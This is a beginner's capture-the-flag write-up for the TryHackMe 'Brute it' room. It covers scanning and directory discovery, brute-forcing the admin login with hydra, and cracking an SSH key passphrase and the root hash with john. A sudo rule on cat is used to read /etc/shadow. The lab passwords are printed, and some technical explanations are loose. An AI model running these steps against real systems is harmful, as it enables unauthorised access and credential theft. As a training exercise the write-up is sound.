# Brute it

# Capture The Flag write-up

- **Platform** : **TryHackMe**
- **Room** : **Brute it**
- **Category** : **Web, Login Bruteforcing, Hash Cracking , Privilege escalation**
- **Difficulty** : **Easy**
- **Completed Date** : **26.10.2026**

## Objective

- To capture the user flag and root flag while answering the questions all along

## Methodology

Reconnaissance => BruteForce Login => Hash Cracking => SSH key =>

User Privilege => Root Privilege

## Actions

## Reconnaissance


### step 1

I namp it first

'''bash: nmap -sV -F -T4 <TARGET_IP>'''

**Findings**

I find ports open in ssh and http.

The server is running Ubuntu as their OS.


### step 2

The question next is about the hidden directories in http site.

so I gobuster it.

'''bash: gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt'''

**Findings**

I find a dirctory named '/admin'.

So I go and check it.

=> http://<TARGET_IP>/admin

It is a login page.SO I gonna bruteforce it in next step.


## Bruteforcing


### step 3

I gonna bruteforce login as admin by using hydra.

'''bash: hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" '''

**Findings**

I get the password.

So username and password are 'admin' and 'xavier'.

### step 4

I login with the 'admin' and 'xavier'.

**Findings**

I find the web flag and RSA key.

But RSA key is hashed. SO I download it for hashing in next step.


## Hash Cracking


### step 5

I go the directory of RSA key I downloaded and we can see 'id_rsa' file.

I gonna use ssh2john to crack this hash, sice john is the popular hash cracking tools.

I first find the location of ssh2john.

'''bash: locate ssh2john.py'''

**Findings**

I find ssh2john.py in '/usr/share/john/ssh2john.py'.

Yours might be different or the same , but I gonna use mine here for demonstration.

### step 6

I crack the hash and make the new file for it.

'''bash: /usr/share/john/ssh2john.py id_rsa >> rsa_hash.txt'''

Then '''bash: ls''' and we can see the new file we created.

Now '''bash: cat rsa_hash.txt'''

**Findings**

As you can see , it's still a hash because john is a hash cracking tools ,so its output is still a hash.

### step 7

Let's turn that hash into readable text.I gonna use john again.

'''bash: john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt'''

**Findings**

OK I get the John's RSA private key passphrase . It's the output of above command, 'rockinroll'.


## SSH Login


### step 8

Add ssh key for ssh login.

'''bash: ssh-add id_rsa'''

Ohh sorry mine doesn't work due to permission.

For permission stuffs,

'''bash: chmod 400 id_rsa'''

Then we gonna add ssh key,

'''bash: ssh-add id_rsa'''

Then add your passphrase , rockinroll.

Now let's login to ssh,

'''bash: ssh john@<TARGET_IP>'''

**Findings**

We are officially in John account. I have to find user flag first.

'''bash: ls'''

and I can see 'user.txt' .I cat it and get the flag.

'''bash: cat user.txt'''


## Privilege Escalation


### step 9

For the root flag, we gonna need root password and privilege.

You can use many way for privilege escalation. But I gonna demonstrate the most basic and begineer-friendly way.

Type

'''bash: sudo -l'''

**Findings**

We can see "(root) NOPASSWD: /bin/cat"

This mean root password is stored in there.Let's go and check there

'''bash: sudo /bin/cat'''

I can't go there.


### step 10

Most of the password in linux are stored in '/etc/shadow'.

So let's go and check there.

'''bash: sudo /bin/cat /etc/shadow'''

**Findings**

Ok at the very top , we can see the password for root but it's hashed. So let's crack it in next step.

### step 11

To crack the root password hash, I copy the hash and open the new terminal without exiting this ssh tab.

Then I create a new file ,

'''bash: touch hash.txt'''

Open it

'''bash: nano hash.txt'''

and paste the hash , save it and close it.

To crack the hash, type

'''bash: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt'''

**Findings**

I get the root password , it's 'football'.

### step 12

Now I gonna use the root password for root access.

'''bash: su'''

and type the root password , football.

**Findings**

I now get root privilege and have to find root flag which is mostly in root directory.

'''bash: cd ../../../../'''

'''bash: cd root'''

'''bash: ls'''

Ok now I can see root.txt.

'''bash: cat root.txt'''

And the challenge is completed.

## Lessons Learned

- Not to use weak password

- Learn how to use john,hash cracking tool

## RealWorld Impact

- Companies should be using strong passwords and improve user authentication and authorization

